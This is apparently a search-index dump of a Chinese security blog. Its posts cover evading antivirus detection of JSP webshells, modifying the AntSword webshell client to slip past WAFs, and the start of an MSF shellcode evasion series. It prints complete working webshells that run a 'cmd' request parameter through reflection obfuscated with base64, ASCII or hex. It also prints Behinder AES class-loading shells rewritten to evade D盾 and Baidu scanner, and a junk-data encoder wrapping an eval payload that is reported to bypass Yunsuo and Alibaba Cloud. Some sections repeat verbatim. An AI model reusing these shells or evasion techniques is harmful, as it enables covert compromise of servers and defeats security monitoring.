121, 122, 100, 100, 77, 114, 54 }); System.out.println(\"ASCII: \"+a); 2.2.2 HEX import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(\"797a64644d7236\")); System.out.println(\"HEX: \"+b); 2.2.3 BASE64 import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(\"eXpkZE1yNg==\")); System.out.println(\"BASE64: \"+c); ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#ascii"},{"categories":["技术文章"],"content":"\r2.2 JSP中的字符串混淆方式\r2.2.1 ASCII String a=new String(new byte[] { 121, 122, 100, 100, 77, 114, 54 }); System.out.println(\"ASCII: \"+a); 2.2.2 HEX import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(\"797a64644d7236\")); System.out.println(\"HEX: \"+b); 2.2.3 BASE64 import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(\"eXpkZE1yNg==\")); System.out.println(\"BASE64: \"+c); ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#hex"},{"categories":["技术文章"],"content":"\r2.2 JSP中的字符串混淆方式\r2.2.1 ASCII String a=new String(new byte[] { 121, 122, 100, 100, 77, 114, 54 }); System.out.println(\"ASCII: \"+a); 2.2.2 HEX import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(\"797a64644d7236\")); System.out.println(\"HEX: \"+b); 2.2.3 BASE64 import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(\"eXpkZE1yNg==\")); System.out.println(\"BASE64: \"+c); ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#base64"},{"categories":["技术文章"],"content":"\r2.3 类反射首先要知道为什么免杀需要用到类反射 类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。 此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。 例子参考大白话说Java反射 2.3.1 使用反射调用对象方法的步骤 Class clz = Class.forName(\"test.Apple\"); // 获取类的 Class 对象实例 Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象 Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象 Method setPriceMethod = clz.getMethod(\"setPrice\", int.class); // 获取方法的 Method 对象 setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法 如果没有构造函数的情况下就更简单了 Class clz = Class.forName(\"test.Apple\"); // 获取类的 Class 对象实例 Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象 Method setPriceMethod = clz.getMethod(\"setPrice\", int.class); // 获取方法的 Method 对象 setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法 从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。 其实也可以压缩一下写成一行的形式 Class.forName(\"test.Apple\").getMethod(\"setPrice\", int.class).invoke(Class.forName(\"test.Apple\").newInstance(),20); 不过当然正常人是不会这么写的。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:3","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#类反射"},{"categories":["技术文章"],"content":"\r2.3 类反射首先要知道为什么免杀需要用到类反射 类反射可以把我们想要调用的函数或者类的名字放到一个字符串的位置。 此时也就相当于我们实现了php中的变量函数，就可以利用base64编码或者hex编码等来混淆关键函数。 例子参考大白话说Java反射 2.3.1 使用反射调用对象方法的步骤 Class clz = Class.forName(\"test.Apple\"); // 获取类的 Class 对象实例 Constructor appleConstructor = clz.getConstructor(); // 根据 Class 对象实例获取 Constructor 对象 Object appleObj = appleConstructor.newInstance();// 使用 Constructor 对象的 newInstance 方法获取反射类对象 Method setPriceMethod = clz.getMethod(\"setPrice\", int.class); // 获取方法的 Method 对象 setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法 如果没有构造函数的情况下就更简单了 Class clz = Class.forName(\"test.Apple\"); // 获取类的 Class 对象实例 Object appleObj=clz.newInstance();// 直接获得clz类的一个实例化对象 Method setPriceMethod = clz.getMethod(\"setPrice\", int.class); // 获取方法的 Method 对象 setPriceMethod.invoke(appleObj, 14); // 利用 invoke 方法调用方法 从图中可以看到，我们用类反射调用了Apple类中的setPrice跟getPrice方法。 其实也可以压缩一下写成一行的形式 Class.forName(\"test.Apple\").getMethod(\"setPrice\", int.class).invoke(Class.forName(\"test.Apple\").newInstance(),20); 不过当然正常人是不会这么写的。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:3","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#使用反射调用对象方法的步骤"},{"categories":["技术文章"],"content":"\r2.4 类加载在LandGrey大佬的文章中提到的类加载的意思是将获得Class对象的方式由 Class rt= Class.forName(“java.lang.Runtime”); 改成 Class rt = ClassLoader.getSystemClassLoader().loadClass(“java.lang.Runtime”);的形式。 但是冰蝎作者在利用动态二进制加密实现新型一句话木马之Java篇中对于类加载是直接传送二进制字节码。 这也是为什么冰蝎能够实现不到1KB的JSP一句话的原因：冰蝎可以做到动态解析二进制class字节码。 学过java的同学应该都知道，java执行代码的时候都要先编译生成.class字节码文件，才能被jvm所执行。 那么也就是说，如果我们能够实现任意class文件的加载，也就相当于实现了php中的eval函数。 我们就用冰蝎中的例子 首先写一个命令执行的类，调一个calc，但是我们不写主函数，也就是说我们先不让他运行。 package test; import java.io.IOException; public class calc { @Override public String toString() { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (IOException e) { e.printStackTrace(); } return \"OK\"; } } 在项目里生成之后，在out目录下可以看到编译好的二进制class文件。 然后把它base64，保存到文件里，去除多余的换行 接着生成一个loader类，用于加载我们的class文件 package test; import sun.misc.BASE64Decoder; public class loader { public static class Myloader extends ClassLoader //继承ClassLoader { public Class get(byte[] b) { return super.defineClass(b, 0, b.length); } } public static void main(String[] args) throws Exception { String classStr=\"xxxxxxxxxxxxxxxxx\"; // class的base64编码 BASE64Decoder code=new sun.misc.BASE64Decoder(); Class result=new Myloader().get(code.decodeBuffer(classStr));//将base64解码成byte数组，并传入t类的get函数 System.out.println(result.newInstance().toString()); } } 运行后成功调用计算器。 我们用类加载的方式成功执行了系统命令。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:4","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#类加载"},{"categories":["技术文章"],"content":"\r3 对命令执行JSP一句话免杀JAVA执行系统命令的核心就是Runtime.getRuntime().exec(cmd) ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:3:0","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#对命令执行jsp一句话免杀"},{"categories":["技术文章"],"content":"\r3.1 原型 \u003c% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\" \u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } out.print(\"\u003c/pre\u003e\"); } %\u003e 经过二分法分析，发现特征码是在Runtime.getRuntime().exec这一句。不知道什么是二分法分析的看我以前的两篇webshell免杀文章。 然后发现D盾对于JSP中只要有exec就会报一级。 那么我们就可以利用类反射的方法来隐藏掉exec函数。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:3:1","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#原型"},{"categories":["技术文章"],"content":"\r3.2 类反射绕过 package test; import java.lang.reflect.Method; import java.util.Scanner; public class Test { public static void main(String[] args) throws Exception { String op = \"\"; Class rt = Class.forName(\"java.lang.Runtime\"); //加载Runtime类 Method gr = rt.getMethod(\"getRuntime\"); //获取getRuntime方法 Method ex = rt.getMethod(\"exec\", String.class); //获取exec方法 Process e = (Process) ex.invoke(gr.invoke(null), \"cmd /c whoami\"); //invoke 传参调用 //以下代码是获取输出结果 Scanner sc = new Scanner(e.getInputStream()).useDelimiter(\"\\\\A\"); op = sc.hasNext() ? sc.next() : op; sc.close(); System.out.print(op); } } 可以看到成功执行了whoami命令 那么接下来就是把他放到jsp里面。 利用base64编码 \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c% if(request.getParameter(\"cmd\")!=null){ BASE64Decoder decoder = new BASE64Decoder(); Class rt = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlJ1bnRpbWU=\"))); Process e = (Process) rt.getMethod(new String(decoder.decodeBuffer(\"ZXhlYw==\")), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(\"Z2V0UnVudGltZQ==\"))).invoke(null, new Object[]{}), request.getParameter(\"cmd\") ); java.io.InputStream in = e.getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\" \u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\u003c/pre\u003e\"); } %\u003e 可以bypass D盾跟百度scanner，下面的都是免杀的，就不截图了。 利用ASCII编码 \u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c% if(request.getParameter(\"cmd\")!=null){ Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 })); Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter(\"cmd\") ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(\" \u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print(\"\u003c/pre\u003e\"); } %\u003e 利用HEX编码 \u003c%@ page contentType=\"text/html;charset=UTF-8\" import=\"javax.xml.bind.DatatypeConverter\" language=\"java\" %\u003e \u003c% if(request.getParameter(\"cmd\")!=null){ Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary(\"6a6176612e6c616e672e52756e74696d65\"))); Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary(\"65786563\")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary(\"67657452756e74696d65\"))).invoke(null), request.getParameter(\"cmd\") ); java.io.InputStream in = e.getInputStream(); int a = -1;byte[] b = new byte[2048];out.print(\" \u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print(\"\u003c/pre\u003e\"); } %\u003e ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:3:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#类反射绕过"},{"categories":["技术文章"],"content":"\r3.3 寻找其他类java中与执行命令相关的主要有两个类 java.lang.Runtime java.lang.ProcessBuilder 我们上文中反射了Runtime类，那么同样我们也可以反射ProcessBuilder类。 原理是相同的，此处不再具体举例实现。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:3:3","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#寻找其他类"},{"categories":["技术文章"],"content":"\r4 对于冰蝎JSP一句话的免杀冰蝎JSP一句话的实现是我最佩服的一点，也是我今后想要加入到蚁剑中的功能。 由于冰蝎中改写的是Object类，所以几乎全部都是非敏感函数。目前各大杀软查杀的规则也并不是特别完善，其实特别容易免杀。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:4:0","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#对于冰蝎jsp一句话的免杀"},{"categories":["技术文章"],"content":"\r4.1 免杀D盾经过二分法查找特征码，D盾对于冰蝎的查杀规则是这一句 new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext); 为了简洁冰蝎作者把很多东西都写到一行里了。那么我们就把其中的变量拆出来试试。 把base64解密那一块给抠出来，实例化给decoder变量。 \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e \u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);} public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e \u003c%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k); out.print(k);return;} Cipher c=Cipher.getInstance(\"AES\"); c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\")); BASE64Decoder decoder=new sun.misc.BASE64Decoder(); new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%\u003e 就已经可以过D盾了 经过测试随便拆其他的也可以，再拆一个uploadString \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e \u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);} public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e \u003c%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k); out.print(k);return;} Cipher c=Cipher.getInstance(\"AES\"); c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\")); String uploadString= request.getReader().readLine(); new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%\u003e 也可以免杀 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:4:1","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#免杀d盾"},{"categories":["技术文章"],"content":"\r4.2 免杀百度scanner拆最后一句免杀不了scanner 经过测试scanner识别冰蝎的特征在这一句 c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\")); 那就再把这一句给拆了 \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e \u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);} public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e \u003c%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k); out.print(k);return;} Cipher c=Cipher.getInstance(\"AES\"); SecretKeySpec sec=new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"); c.init(2,sec); String uploadString= request.getReader().readLine(); new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%\u003e 这时候就可以两个都免杀了 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:4:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#免杀百度scanner"},{"categories":["技术文章"],"content":"\r5 最后其实还有很多方式值得去探索，就比如命令执行一句话那里。 我们可以在shell里只放类加载函数，而不含具体的payload。 然后写一个命令类，类里接收一个String类型的参数，作为所要执行的cmd语句。然后把它编译成二进制class，通过GET型或者POST型传过去。 其中cmd参数也从GET传入，经过shell发送到命令执行类中，就相当于实现了php中形如 http://test.com/shell.php?func=system\u0026cmd=whoami 的回调函数后门。 其中有一个师傅已经实现了菜刀的远程加载类，文章地址：http://p2j.cn/?p=1627 不过所有的jar包都放在作者的博客上，也就是说每个shell都会先访问他的博客，还是建议自己搭建。 套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:5:0","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#最后"},{"categories":["技术文章"],"content":"蚁剑改造计划之增加垃圾数据","date":"2020-01-18","objectID":"/posts/antsword-diy-1/","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/"},{"categories":["技术文章"],"content":"\r1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。 不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:1:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#正文"},{"categories":["技术文章"],"content":"\r2.1 思路简介大家都知道垃圾数据填充可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤，大家常常把这种方法叫做缓冲区溢出。 原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。 同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，只不过要稍加修改。因为实际测试过程中发现，仅仅在payload前面加上超长字符串对于某里云来说并没有卵用，似乎已经免疫。但是换了个思路，发现改成增加大量垃圾键值对之后就可以bypass，那就暂且把这种方法叫做增加垃圾数据绕过法吧。 这篇文章主要介绍这种方法，以及如何把这个功能移植到蚁剑上。 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:1","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#思路简介"},{"categories":["技术文章"],"content":"\r2.2 编码器实现这篇文章本来是几个月前发在自己的星球里，名字叫做蚁剑编码器之流量混淆。当时想着怎么方便怎么来，所以采用的是最简单、改动最小的一种实现方式–编码器实现。 这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。 let varname_min = 5; //变量名最小长度 let varname_max = 15; // 变量名最大长度 let data_min = 200; // 变量值最小长度 let data_max = 250; // 变量值最大长度 let num_min = 150; // 变量最小个数 let num_max = 250; // 变量最大个数 function randomString(length) { // 生成随机字符串 //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let result = ''; for (let i = length; i \u003e 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; } function randomInt(min, max) { //生成指定范围内的随机数 return parseInt(Math.random() * (max - min + 1) + min, 10); } for (let i = 0; i \u003c randomInt(num_min, num_max); i++) { //将混淆流量放入到payload数组中 data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); } 那么怎么用呢 很简单，就直接把这段代码放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例 'use strict'; /* code by yzddMr6 */ module.exports = (pwd, data, ext = {}) =\u003e { let varname_min = 5; let varname_max = 15; let data_min = 200; let data_max = 250; let num_min = 100; let num_max = 200; let randomID = `_0x${Math.random().toString(16).substr(2)}`; data[randomID] = Buffer.from(data['_']).toString('base64'); function randomString(length) { //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let result = ''; for (let i = length; i \u003e 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; } function randomInt(min, max) { return parseInt(Math.random() * (max - min + 1) + min, 10); } for (let i = 0; i \u003c randomInt(num_min, num_max); i++) { data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max)); } data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`; delete data['_']; return data; } ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:2","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#编码器实现"},{"categories":["技术文章"],"content":"\r2.3 过云锁测试本来想用安全狗，结果发现好像免费版不能拦截一句话。 那就用云锁开刀吧。 首先在虚拟机里放个一句话，就用某辣鸡项目生成的 可以正常运行 然后使用蚁剑默认的base64编码器连接试一下 云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击 然后使用我们上面的流量混淆编码器 shell正常连接，成功bypass云锁。 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#过云锁测试"},{"categories":["技术文章"],"content":"\r2.4 过阿里云测试这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。 众所周知阿里云是以封IP著名，一言不合就全网ban你。不仅站x不了，甚至很多其他网站都打不开。。。 反正要到期了，码也懒得打了。 首先用backdoor study搭建个环境 这时候要找一个免杀马放上去，不然的话连接之前就被阿里云ban了 然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了 这时候换上加了垃圾数据污染后的编码器 正常执行命令 写文件测试 bypass阿里云 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:4","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#过阿里云测试"},{"categories":["技术文章"],"content":"\r2.5 蚁剑核心功能实现理论上这种方法不管是asp php aspx jsp都可以用到，如果按照编码器实现的话就要建立四个编码器，觉得还是加入到核心功能中比较好。 这几天看了一下蚁剑的架构，感叹于设计者思路的精妙。 首先我们可以看看他modules目录下的request模块的内容 可以看到两个if else 语句 /** * 监听HTTP请求 * @param {Object} event ipcMain事件对象 * @param {Object} opts 请求配置 * @return {[type]} [description] */ onRequest(event, opts) { logger.debug('onRequest::opts', opts); if (opts['url'].match(CONF.urlblacklist)) { return event .sender .send('request-error-' + opts['hash'], \"Blacklist URL\"); } let _request = superagent.post(opts['url']); // 设置headers _request.set('User-Agent', USER_AGENT); // 自定义headers for (let _ in opts.headers) { _request.set(_, opts.headers[_]); } // 自定义body const _postData = Object.assign({}, opts.body, opts.data); if (opts['useChunk'] == 1) { logger.debug(\"request with Chunked\"); let _postarr = []; for (var key in _postData) { if (_postData.hasOwnProperty(key)) { let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\\((.+?)\\)/g, function ($, $1) { return unescape($1); }); // 后续可能需要二次处理的在这里追加 _postarr.push(`${key}=${_tmp}`); } } let antstream = new AntRead(_postarr.join(\"\u0026\"), { 'step': parseInt(opts['chunkStepMin']), 'stepmax': parseInt(opts['chunkStepMax']) }); xxxxxxx } else { // 通过替换函数方式来实现发包方式切换, 后续可改成别的 const old_send = _request.send; let _postarr = []; if (opts['useMultipart'] == 1) { _request.send = _request.field; for (var key in _postData) { if (_postData.hasOwnProperty(key)) { let _tmp = (_postData[key]).replace(/asunescape\\((.+?)\\)/g, function ($, $1) { return unescape($1) }); _postarr[key] = _tmp; } } } else { _request.send = old_send; for (var key in _postData) { if (_postData.hasOwnProperty(key)) { let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\\((.+?)\\)/g, function ($, $1) { return unescape($1) }); // 后续可能需要二次处理的在这里追加 _postarr.push(`${key}=${_tmp}`); } } _postarr = _postarr.join('\u0026'); } 大概就是说如果开启了chunk传输后不拉不拉，否则的话就看看是否开启了Multipart，如果开启了不拉不拉，否则咕叽咕叽。 主要的payload是以字典的形式放到_postData中，然后字典键跟值用=连接后放到_postarr数组中，最后再把_postarr数组用\u0026连接起来就是我们最终发包的payload了。 那么这里也就是我们要下手修改的地方，照葫芦画瓢，再增加一个else语句 因为我这里都改好了，就直接截图说要改哪些点吧。 opts`为在界面中选择的选项，这里起个名字叫`addMassData 然后要到source/core/base.js中增加你的配置选项，注意的是蚁剑把普通请求跟下载请求的发包是分开的，所以需要改两处，自己vscode搜一下改一下。 // 发送请求数据 .send('request', { url: this.__opts__['url'], hash: hash, data: opt['data'], tag_s: opt['tag_s'], tag_e: opt['tag_e'], encode: this.__opts__['encode'], ignoreHTTPS: (this.__opts__['otherConf'] || {})['ignore-https'] === 1, useChunk: (this.__opts__['otherConf'] || {})['use-chunk'] === 1, chunkStepMin: (this.__opts__['otherConf'] || {})['chunk-step-byte-min'] || 2, chunkStepMax: (this.__opts__['otherConf'] || {})['chunk-step-byte-max'] || 3, useMultipart: (this.__opts__['otherConf'] || {})['use-multipart'] === 1, addMassData: (this.__opts__['otherConf'] || {})['add-MassData'] === 1, useRandomVariable: (this.__opts__['otherConf'] || {})['use-random-variable'] === 1, timeout: parseInt((this.__opts__['otherConf'] || {})['request-timeout']), headers: (this.__opts__['httpConf'] || {})['headers'] || {}, body: (this.__opts__['httpConf'] || {})['body'] || {} }); }) } 后端改完之后要改前端了，前端修改内容是在source\\modules\\shellmanager\\list\\form.js中存放 增加一个checkbox，注意label名字不要写错。 然后改语言文件，这个没什么好说的。 全部改完之后重启蚁剑(注意是把软件x掉重新双击打开，否则某些改动不会更新)，设置中就可以看到我们新增加的增加垃圾数据选项了 选中后发包测试一下 可以看到已经成功啦 一半 接着发现一个奇怪的问题，每次payload都是在第一个 这样肯定是不行的，所以我们还需要写一个随机函数，让字典随机排序 没有现成的函数，随手搓一个 附上辣鸡代码 function randomDict(dic){ let tmparray=[] for(let i in dic){ tmparray.push(i) } tmparray=tmparray.sort((a, b)=\u003e { return Math.random() \u003e 0.5 ? -1 : 1; }) let finaldata={} tmparray.forEach(i =\u003e { finaldata[i]=dic[i] }); return finaldata } 然后出现了点小插曲 因为_postData是const类型，不能直接修改 既然追求刺激，那就贯彻到底啦，直接改成let 再试一下就可以实现字典随机排序了 发现还可以正常使用，改了就改了吧 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:5","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#蚁剑核心功能实现"},{"categories":["技术文章"],"content":"\r2.6 asp测试\r","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:6","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#asp测试"},{"categories":["技术文章"],"content":"\r2.7 aspx测试\rasp,aspx类型的shell都可以正常使用 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:2:7","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#aspx测试"},{"categories":["技术文章"],"content":"\r3 最后参数个数可以根据实际情况自行修改，不过一般也不需要改，所以就没有写到UI中。 把参数个数改大可能会绕过更多waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。 ","date":"2020-01-18","objectID":"/posts/antsword-diy-1/:3:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之增加垃圾数据","uri":"/posts/antsword-diy-1/#最后"},{"categories":["技术文章"],"content":"\r1 前言这是一个免杀系列文章。 因为自己二进制方面就是个弟弟，所以并不敢冒然称之为教程，只是记录自己在免杀过程中的各种坑以及效果对比。 其实各种办法已经在大佬们的文章中多多少少都有提到过，但是大多数都是讲述一下思路后一笔带过，然而实现的过程中往往会有各种坑。所以想着写一个系列文章，能够让像我这样的WEB选手可以用最简单的办法快速BypassAV。 记录的过程也是自己提高的过程，如果有好的思路可以联系我跟我一起交流，如果有说的不对的地方还望不吝赐教。 本文主要讲利用远程shellcode加载器实现文件不落地免杀。 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:1:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#前言"},{"categories":["技术文章"],"content":"\r2 正文看了倾旋大佬静态恶意代码逃逸系列文章后也想写一个自己的shellcode加载器，但是觉得实际中其实不需要专门起一个服务来连接msf生成shellcode，作为本人来说shellcode也不需要天天换，手工生成就可以了。 后来又看到了K8大佬的文章，采用的是py+命令行传入hex编码后的shellcode实现文件不落地免杀。 但是本人觉得命令行传入一长串东西不太方便，因为如果进行多重编码处理后的shellcode会变得比较大，理想的办法是把shellcode放到一个地方来远程加载，这也是本文的思路。 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#正文"},{"categories":["技术文章"],"content":"\r2.1 测试环境系统环境：kali，win7 (x64)，win10(x64) 测试杀软： 360+火绒+defender 防护全开 免杀工具： msfvenom pyinstaller 注：为了模拟真实环境，360跟火绒全部开启文件云上传。 文中测试方法如果没有特殊说明均为防护状态全开情况下静默上线。 